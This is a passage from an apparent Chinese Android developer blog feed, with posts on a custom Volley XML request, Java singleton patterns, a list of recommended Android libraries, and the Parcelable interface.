class="attribute">tem1</span>=<span class="value">"9"</span> <span class="attribute">tem2</span>=<span class="value">"18"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"广西"</span> <span class="attribute">pyName</span>=<span class="value">"guangxi"</span> <span class="attribute">cityname</span>=<span class="value">"南宁"</span> <span class="attribute">state1</span>=<span class="value">"7"</span> <span class="attribute">state2</span>=<span class="value">"7"</span> <span class="attribute">stateDetailed</span>=<span class="value">"小雨"</span> <span class="attribute">tem1</span>=<span class="value">"5"</span> <span class="attribute">tem2</span>=<span class="value">"8"</span> <span class="attribute">windState</span>=<span class="value">"东风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"北京"</span> <span class="attribute">pyName</span>=<span class="value">"beijing"</span> <span class="attribute">cityname</span>=<span class="value">"北京"</span> <span class="attribute">state1</span>=<span class="value">"0"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"晴转多云"</span> <span class="attribute">tem1</span>=<span class="value">"-7"</span> <span class="attribute">tem2</span>=<span class="value">"2"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"天津"</span> <span class="attribute">pyName</span>=<span class="value">"tianjin"</span> <span class="attribute">cityname</span>=<span class="value">"天津"</span> <span class="attribute">state1</span>=<span class="value">"0"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"晴转多云"</span> <span class="attribute">tem1</span>=<span class="value">"-5"</span> <span class="attribute">tem2</span>=<span class="value">"5"</span> <span class="attribute">windState</span>=<span class="value">"西北风转西风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"上海"</span> <span class="attribute">pyName</span>=<span class="value">"shanghai"</span> <span class="attribute">cityname</span>=<span class="value">"上海"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"7"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴转小雨"</span> <span class="attribute">tem1</span>=<span class="value">"3"</span> <span class="attribute">tem2</span>=<span class="value">"7"</span> <span class="attribute">windState</span>=<span class="value">"微风转东北风小于3级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"重庆"</span> <span class="attribute">pyName</span>=<span class="value">"chongqing"</span> <span class="attribute">cityname</span>=<span class="value">"重庆"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴"</span> <span class="attribute">tem1</span>=<span class="value">"5"</span> <span class="attribute">tem2</span>=<span class="value">"8"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"香港"</span> <span class="attribute">pyName</span>=<span class="value">"xianggang"</span> <span class="attribute">cityname</span>=<span class="value">"香港"</span> <span class="attribute">state1</span>=<span class="value">"1"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"多云"</span> <span class="attribute">tem1</span>=<span class="value">"14"</span> <span class="attribute">tem2</span>=<span class="value">"17"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"澳门"</span> <span class="attribute">pyName</span>=<span class="value">"aomen"</span> <span class="attribute">cityname</span>=<span class="value">"澳门"</span> <span class="attribute">state1</span>=<span class="value">"2"</span> <span class="attribute">state2</span>=<span class="value">"1"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阴转多云"</span> <span class="attribute">tem1</span>=<span class="value">"12"</span> <span class="attribute">tem2</span>=<span class="value">"19"</span> <span class="attribute">windState</span>=<span class="value">"东北风3-4级转微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"台湾"</span> <span class="attribute">pyName</span>=<span class="value">"taiwan"</span> <span class="attribute">cityname</span>=<span class="value">"台北"</span> <span class="attribute">state1</span>=<span class="value">"7"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"小雨转阴"</span> <span class="attribute">tem1</span>=<span class="value">"11"</span> <span class="attribute">tem2</span>=<span class="value">"17"</span> <span class="attribute">windState</span>=<span class="value">"微风"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"西沙"</span> <span class="attribute">pyName</span>=<span class="value">"xisha"</span> <span class="attribute">cityname</span>=<span class="value">"西沙"</span> <span class="attribute">state1</span>=<span class="value">"3"</span> <span class="attribute">state2</span>=<span class="value">"3"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阵雨"</span> <span class="attribute">tem1</span>=<span class="value">"20"</span> <span class="attribute">tem2</span>=<span class="value">"25"</span> <span class="attribute">windState</span>=<span class="value">"东北风5-6级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"南沙"</span> <span class="attribute">pyName</span>=<span class="value">"nanshadao"</span> <span class="attribute">cityname</span>=<span class="value">"南沙"</span> <span class="attribute">state1</span>=<span class="value">"3"</span> <span class="attribute">state2</span>=<span class="value">"3"</span> <span class="attribute">stateDetailed</span>=<span class="value">"阵雨"</span> <span class="attribute">tem1</span>=<span class="value">"24"</span> <span class="attribute">tem2</span>=<span class="value">"27"</span> <span class="attribute">windState</span>=<span class="value">"东北风5-6级"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">city</span> <span class="attribute">quName</span>=<span class="value">"钓鱼岛"</span> <span class="attribute">pyName</span>=<span class="value">"diaoyudao"</span> <span class="attribute">cityname</span>=<span class="value">"钓鱼岛"</span> <span class="attribute">state1</span>=<span class="value">"7"</span> <span class="attribute">state2</span>=<span class="value">"2"</span> <span class="attribute">stateDetailed</span>=<span class="value">"小雨转阴"</span> <span class="attribute">tem1</span>=<span class="value">"13"</span> <span class="attribute">tem2</span>=<span class="value">"15"</span> <span class="attribute">windState</span>=<span class="value">"东北风5-6级转北风3-4级"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">china</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试接口的实现：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">XMLRequest xmlRequest = <span class="keyword">new</span> XMLRequest(  </span><br><span class="line">        <span class="string">"http://flash.weather.com.cn/wmaps/xml/china.xml"</span>,  </span><br><span class="line">        <span class="keyword">new</span> Response.Listener&lt;XmlPullParser&gt;() &#123;  </span><br><span class="line">            <span class="annotation">@Override</span>  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(XmlPullParser response)</span> </span>&#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    <span class="keyword">int</span> eventType = response.getEventType();  </span><br><span class="line">                    <span class="keyword">while</span> (eventType != XmlPullParser.END_DOCUMENT) &#123;  </span><br><span class="line">                        <span class="keyword">switch</span> (eventType) &#123;  </span><br><span class="line">                        <span class="keyword">case</span> XmlPullParser.START_TAG:  </span><br><span class="line">                            String nodeName = response.getName();  </span><br><span class="line">                            <span class="keyword">if</span> (<span class="string">"city"</span>.equals(nodeName)) &#123;  </span><br><span class="line">                                String pName = response.getAttributeValue(<span class="number">0</span>);  </span><br><span class="line">                                Log.d(<span class="string">"TAG"</span>, <span class="string">"pName is "</span> + pName);  </span><br><span class="line">                            &#125;  </span><br><span class="line">                            <span class="keyword">break</span>;  </span><br><span class="line">                        &#125;  </span><br><span class="line">                        eventType = response.next();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (XmlPullParserException e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;, <span class="keyword">new</span> Response.ErrorListener() &#123;  </span><br><span class="line">            <span class="annotation">@Override</span>  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onErrorResponse</span><span class="params">(VolleyError error)</span> </span>&#123;  </span><br><span class="line">                Log.e(<span class="string">"TAG"</span>, error.getMessage(), error);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">mQueue.add(xmlRequest);</span><br></pre></td></tr></table></figure></p>
<p>运行上述的测试例子，在Log栏中可以看到解析后的打印。具体信息如下：</p>
<p><img src="" alt=""></p>
<h2 id="总结：">总结：</h2><p>Volley是一个易于使用和扩展的网络加载库，通过这个例子，我们掌握了如何在Volley的基础上自定义我们的Request。当然你还可以根据自己的需求，来实现自定义的请求类型。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>谷歌官方提供的Volley包中，已经提供了多种Request，如StringRequest， JsonRequest，ImageRequest等。谷歌官方只提供了Json请求封装，用于请求一条JSON格式的数据。目前，网络上传输的数据通常有两种方式，JSON和XML。今天我们就来自定义自己的XML请求。<br>]]>
    
    </summary>
    
      <category term="Volley" scheme="http://science09.github.io/tags/Volley/"/>
    
      <category term="XMLRequest" scheme="http://science09.github.io/tags/XMLRequest/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java中的单例模式]]></title>
    <link href="http://science09.github.io/2015/01/31/Java%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <id>http://science09.github.io/2015/01/31/Java单例模式/</id>
    <published>2015-01-31T08:09:06.000Z</published>
    <updated>2015-09-10T14:15:11.000Z</updated>
    <content type="html"><![CDATA[<h2 id="什么是单例模式">什么是单例模式</h2><p>数学与逻辑学中，singleton定义为“有且仅有一个元素的集合”。单例模式最初的定义出现于《设计模式》（艾迪生维斯理, 1994）：“保证一个类仅有一个实例，并提供一个访问它的全局访问点。” Java中单例模式定义：“一个类有且仅有一个实例，并且自行实例化向整个系统提供。”<br><a id="more"></a><br>单例模式是设计模式中最简单的形式之一。这一模式的目的是使得类的一个对象成为系统中的唯一实例。要实现这一点，可以从客户端对其进行实例化开始。因此需要用一种只允许生成对象类的唯一实例的机制，“阻止”所有想要生成对象的访问。使用工厂方法来限制实例化过程。这个方法应该是静态方法（类方法），因为让类的实例去生成另一个唯一实例毫无意义。</p>
<h2 id="案例">案例</h2><p>当一个类的实例可以有且只可以一个的时候就需要用到了。为什么只需要有一个呢？有人说是为了节约内存，但这只是单例模式带来的一个好处。只有一个实例确实减少内存占用，可是我认为这不是使用单例模式的理由。我认为使用单例模式的时机是当实例存在多个会引起程序逻辑错误的时候。比如类似有序的号码生成器这样的东西，怎么可以允许一个应用上存在多个呢？</p>
<p>Singleton模式主要作用是保证在Java应用程序中，一个类Class只有一个实例存在。</p>
<ul>
<li>1 懒汉式实现(线程安全)：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SingletonClass instance=<span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingletonClass <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(SingletonClass.class) &#123;</span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="keyword">null</span>)</span><br><span class="line">                    instance = <span class="keyword">new</span> SingletonClass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SingletonClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种写法能够在多线程中很好的工作，而且看起来它也具备很好的lazy loading，但是，遗憾的是，效率很低，99%情况下不需要同步。</p>
<ul>
<li>2 饿汉式实现：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    <span class="comment">//在自己内部定义自己的一个实例，只供内部调用</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里提供了一个供外部访问本class的静态方法，可以直接访问</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 这种方式基于classloder机制避免了多线程的同步问题，不过，instance在类装载时就实例化，虽然导致类装载的原因有很多种，在单例模式中大多数都是调用getInstance方法， 但是也不能确定有其他的方式（或者其他的静态方法）导致类装载，这时候初始化instance显然没有达到lazy loading的效果。</p>
<ul>
<li>3 双重锁实现：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">null</span> == instance) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>4 枚举实现：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whateverMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 这种方式是Effective Java作者Josh Bloch 提倡的方式，它不仅能避免多线程同步问题，而且还能防止反序列化重新创建新的对象，可谓是很坚强的壁垒啊，不过，个人认为由于1.5中才加入enum特性，用这种方式写不免让人感觉生疏，在实际工作中，我也很少看见有人这么写过。</p>
<ul>
<li>5 静态内部类实现：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span> <span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种方式同样利用了classloder的机制来保证初始化instance时只有一个线程。</p>
<h2 id="单例模式的优缺点">单例模式的优缺点</h2><h4 id="优点">优点</h4><ul>
<li>一、实例控制</li>
</ul>
<p>单例模式会阻止其他对象实例化其自己的单例对象的副本，从而确保所有对象都访问唯一实例。</p>
<ul>
<li>二、灵活性</li>
</ul>
<p>因为类控制了实例化过程，所以类可以灵活更改实例化过程。</p>
<h4 id="缺点">缺点</h4><ul>
<li>一、开销</li>
</ul>
<p>虽然数量很少，但如果每次对象请求引用时都要检查是否存在类的实例，将仍然需要一些开销。可以通过使用静态初始化解决此问题。</p>
<ul>
<li>二、可能的开发混淆</li>
</ul>
<p>使用单例对象（尤其在类库中定义的对象）时，开发人员必须记住自己不能使用new关键字实例化对象。因为可能无法访问库源代码，因此应用程序开发人员可能会意外发现自己无法直接实例化此类。</p>
<ul>
<li>三、对象生存期</li>
</ul>
<p>不能解决删除单个对象的问题。在提供内存管理的语言中，只有单例类能够导致实例被取消分配，因为它包含对该实例的私有引用。在某些语言中（如 C++），其他类可以删除对象实例，但这样会导致单例类中出现悬浮引用。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="什么是单例模式">什么是单例模式</h2><p>数学与逻辑学中，singleton定义为“有且仅有一个元素的集合”。单例模式最初的定义出现于《设计模式》（艾迪生维斯理, 1994）：“保证一个类仅有一个实例，并提供一个访问它的全局访问点。” Java中单例模式定义：“一个类有且仅有一个实例，并且自行实例化向整个系统提供。”<br>]]>
    
    </summary>
    
      <category term="java" scheme="http://science09.github.io/tags/java/"/>
    
      <category term="设计模式" scheme="http://science09.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android 常用工具类库]]></title>
    <link href="http://science09.github.io/2015/01/06/Android-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%BA%93/"/>
    <id>http://science09.github.io/2015/01/06/Android-常用工具类库/</id>
    <published>2015-01-06T14:49:48.000Z</published>
    <updated>2015-09-10T13:19:56.000Z</updated>
    <content type="html"><![CDATA[<p>在Android开发中，经常用到的一些功能：</p>
<ol>
<li>下载，比如图片，文件。</li>
<li>将下载的文件进行解压。</li>
<li>请求服务器，比如说上传登陆信息，更新某些数据，又或者上传头像文件。<a id="more"></a></li>
<li>从文件系统中选择要操作的文件（图片，拍照，视频，拍摄视频）。</li>
<li>有时候也需要爬取某些网页数据。</li>
<li>存储一些配置信息</li>
<li>播放视频</li>
<li>再有一个特殊需求就是关乎Android程序UI设计，图标是个很麻烦的问题。每次都难以找到合适的Android 设计UI。</li>
</ol>
<h2 id="Android开发库Afinal">Android开发库Afinal</h2><p>afinal是一个很方便的工具库。<br><a href="https://github.com/yangfuhai/afinal" target="_blank" rel="external">GitHub</a><br><a href="http://www.zimeitix.com/" target="_blank" rel="external">作者博客</a> （注：国人项目哟）</p>
<ul>
<li>一行代码就可以对数据库进行增删改查。 </li>
<li>完全注解方式就可以进行UI绑定和事件绑定。无需findViewById和setClickListener等。</li>
<li>轻松实现Android上传文件，POST数据，下载文件（支持断点续传，随时停止下载任务 或者 开始任务）。</li>
<li>一行代码加载网络图片。</li>
</ul>
<h2 id="android-async-http">android-async-http</h2><p>Android下的异步HTTP库。<br><a href="https://github.com/loopj/android-async-http" target="_blank" rel="external">GitHub</a><br><a href="http://loopj.com/android-async-http/" target="_blank" rel="external">文档</a>    PS：作者的GitHub值得关注。</p>
<ul>
<li>发送异步http请求，并且可在回调函数中处理返回响应Response。</li>
<li>http请求在thread线程，不会阻塞UI线程。</li>
<li>请求使用线程池（ThreadPool）实现，优化了并发的资源使用。</li>
<li>支持Multipart 文件上传。</li>
<li>如果Request请求失败，会自动请求。</li>
<li>支持Json解码。</li>
<li>支持存储Cookies到Preference中。</li>
<li>支持gzip处理Request以及Response。</li>
<li>整个库只有19KB。</li>
</ul>
<h2 id="http-requests">http-requests</h2><p>Java http请求库，设计的很优雅的一个库，推荐。<br><a href="https://github.com/kevinsawicki/http-request" target="_blank" rel="external">GitHub</a></p>
<h2 id="async-http-client">async-http-client</h2><p>Android下的异步 Http 和 WebSocket 库。<br><a href="https://github.com/AsyncHttpClient/async-http-client" target="_blank" rel="external">GitHub</a></p>
<ul>
<li>支持代理设置</li>
<li>支持分片儿处理请求返回内容</li>
<li>支持WebSocket</li>
</ul>
<h2 id="zt-zip:">zt-zip:</h2><p>压缩和解压库的库。<br><a href="https://github.com/zeroturnaround/zt-zip" target="_blank" rel="external">GitHub</a></p>
<ul>
<li>压缩和解压</li>
<li>单独操作文件压缩和解压。</li>
<li>替换zip文件中的某个文件</li>
</ul>
<h2 id="aFileChooser">aFileChooser</h2><p>文件选择器,用于选择需要操作的文件<br><a href="https://github.com/iPaulPro/aFileChooser" target="_blank" rel="external">GitHub</a></p>
<h2 id="image-chooser-library">image-chooser-library</h2><p>图片和视频的选择库。<br><a href="https://github.com/coomar2841/image-chooser-library" target="_blank" rel="external">GitHub</a><br><a href="https://play.google.com/store/apps/details?id=com.beanie.imagechooserapp" target="_blank" rel="external">Demo</a></p>
<h2 id="jsoup">jsoup</h2><p>HTML解析，并且能很好理解DOM，CSS，以及JQuery。<br><a href="https://github.com/jhy/jsoup" target="_blank" rel="external">GitHub</a><br><a href="http://jsoup.org/" target="_blank" rel="external">官方</a>   PS：这是java库。做网页爬虫（Crawler,Robot）必备。</p>
<h2 id="toml">toml</h2><p>这是个跨语言的配置信息存取方案。<br><a href="https://github.com/mojombo/toml" target="_blank" rel="external">GitHub</a></p>
<h2 id="Androiton-Action-Bar-Icons">Androiton-Action-Bar-Icons</h2><p>一个针对Android 优化过的ICON图标集。<br><a href="https://github.com/svenkapudija/Androton-Action-Bar-Icons" target="_blank" rel="external">GitHub</a><br><a href="https://a248.e.akamai.net/camo.github.com/13191b852f282fa929aad94cccc4d885c77e5d2a/687474703a2f2f692e696d6775722e636f6d2f576b654e496b522e706e67" target="_blank" rel="external">Demo</a></p>
<h2 id="ThinkAndroid">ThinkAndroid</h2><p>推荐一个Android整体框架：ThinkAndroid 集成了ioc，orm，下载，缓存等模块，能让开发更加快速和高效，同时还是国人项目。<br><a href="https://github.com/white-cat/ThinkAndroid" target="_blank" rel="external">GitHub</a></p>
<h2 id="OKHTTP">OKHTTP</h2><p>如果你想要更快的网络传输和加载速度可以试试OKHTTP，他实现了Google开发的SPDY协议，通过复用一个Socket，缩短网络加载时间。<br><a href="http://www.williamlong.info/archives/3119.html" target="_blank" rel="external">关于SPDY看这里</a><br><a href="http://square.github.io/okhttp/" target="_blank" rel="external">OKHTTP</a></p>
<h2 id="Android-ProgressFragment">Android-ProgressFragment</h2><p>等待数据的时候，支持显示等待符号的Fragment控件。<br><a href="https://github.com/johnkil/Android-ProgressFragment" target="_blank" rel="external">GitHub</a></p>
<h2 id="Vitamio">Vitamio</h2><p>关于播放视频，不要再去研究什么FFMPEG了，too slow，国人有个非常非常出色的开源项目叫Vitamio，让你播放视频简单如abc。<br><a href="https://github.com/yixia/VitamioBundle" target="_blank" rel="external">GitHub</a><br><a href="http://www.vitamio.org/" target="_blank" rel="external">官方网站</a></p>
<h2 id="AndroidCommon">AndroidCommon</h2><p>Android常用的一些库和功能，如缓存，下拉列表，下载管理，静默安装等。感谢Trinea  <a href="https://github.com/Trinea/AndroidCommon" target="_blank" rel="external">GitHub</a></p>
<h2 id="ion">ion</h2><p>让Android的网络操作变得极其简单，支持异步获取和处理JSON，支持Android文件下载（同时支持下载进度条绑定），支持安全链接和代理。超级推荐！<br><a href="https://github.com/koush/ion" target="_blank" rel="external">GitHub</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在Android开发中，经常用到的一些功能：</p>
<ol>
<li>下载，比如图片，文件。</li>
<li>将下载的文件进行解压。</li>
<li>请求服务器，比如说上传登陆信息，更新某些数据，又或者上传头像文件。]]>
    
    </summary>
    
      <category term="Android库" scheme="http://science09.github.io/tags/Android%E5%BA%93/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android中的Parcelable接口浅谈]]></title>
    <link href="http://science09.github.io/2014/12/13/Android%E4%B8%AD%E7%9A%84Parcelable%E6%8E%A5%E5%8F%A3%E6%B5%85%E8%B0%88/"/>
    <id>http://science09.github.io/2014/12/13/Android中的Parcelable接口浅谈/</id>
    <published>2014-12-13T11:59:36.000Z</published>
    <updated>2015-09-10T13:29:32.000Z</updated>
    <content type="html"><![CDATA[<h2 id="1-_什么是Parcelable接口">1. 什么是Parcelable接口</h2><p>序列化是将对象状态转换为可保持或传输的格式的过程。与序列化相对的是反序列化，它将流转换为对象。这两个过程结合起来，可以轻松地存储和传输数据。<br><a id="more"></a></p>
<h2 id="2-为什么要序列化">2.为什么要序列化</h2><ul>
<li>永久性保存对象，保存对象的字节序列到本地文件中；</li>
<li>通过序列化对象在网络中传递对象；</li>
<li>通过序列化在进程间传递对象；</li>
</ul>
<h2 id="3-实现序列化的方法">3.实现序列化的方法</h2><p>Android中实现序列化有两个选择：一是实现Serializable接口（是JavaSE本身就支持的），一是实现Parcelable接口（是Android特有功能，效率比实现Serializable接口高效，可用于Intent数据传递，也可以用于进程间通信（IPC））。实现Serializable接口非常简单，声明一下就可以了，而实现Parcelable接口稍微复杂一些，但效率更高，推荐用这种方法提高性能。</p>
<p>注：Android中Intent传递对象有两种方法：一是Bundle.putSerializable(Key，Object)，另一种是Bundle.putParcelable(Key，Object)。当然这些Object是有一定的条件的，前者是实现了Serializable接口，而后者是实现了Parcelable接口。</p>
<h2 id="4-选择序列化方法的原则">4.选择序列化方法的原则</h2><ul>
<li>在使用内存的时候，Parcelable比Serializable性能高，所以推荐使用Parcelable。</li>
<li>Serializable在序列化的时候会产生大量的临时变量，从而引起频繁的GC。</li>
<li>Parcelable不能使用在要将数据存储在磁盘上的情况，因为Parcelable不能很好的保证数据的持续性在外界有变化的情况下。尽管Serializable效率低点，但此时还是建议使用Serializable 。</li>
</ul>
<h2 id="5-应用场景">5.应用场景</h2><p>需要在多个部件(Activity或Service)之间通过Intent传递一些数据，简单类型（如：数字、字符串）的可以直接放入Intent。复杂类型必须实现Parcelable接口。</p>
